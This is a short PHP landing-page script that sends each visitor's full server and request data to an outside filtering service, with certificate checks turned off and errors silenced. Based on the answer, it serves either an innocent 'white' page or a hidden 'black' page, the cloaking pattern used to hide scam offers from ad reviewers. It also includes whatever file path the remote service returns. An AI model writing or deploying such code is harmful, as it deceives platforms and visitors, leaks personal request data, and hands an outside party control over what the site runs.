<?php
error_reporting( 0 );
$curl = curl_init( "https://www.altercpa.one/fltr/378-88982ac2b153331c412f6a118148a782-3988" );
curl_setopt( $curl, CURLOPT_POST, true );
curl_setopt( $curl, CURLOPT_POSTFIELDS, http_build_query($_SERVER) );
curl_setopt( $curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:104.0) Gecko/20100101 Firefox/104.0' );
curl_setopt( $curl, CURLOPT_RETURNTRANSFER, true );
curl_setopt( $curl, CURLOPT_SSL_VERIFYHOST, 0 );
curl_setopt( $curl, CURLOPT_SSL_VERIFYPEER, 0 );
curl_setopt( $curl, CURLOPT_ENCODING, '' );
$result = curl_exec( $curl );
curl_close( $curl );
$result = $result ? json_decode( $result, true ) : array( "type" => "white", "url" => "dubki_white.html" );
if ( isset( $result["type"] ) && $result["type"] == "black" ) {
	include( $result["url"] ? $result["url"] : "black-index.php" );
} else {
	include( $result["url"] ? $result["url"] : "white-index.php" );
}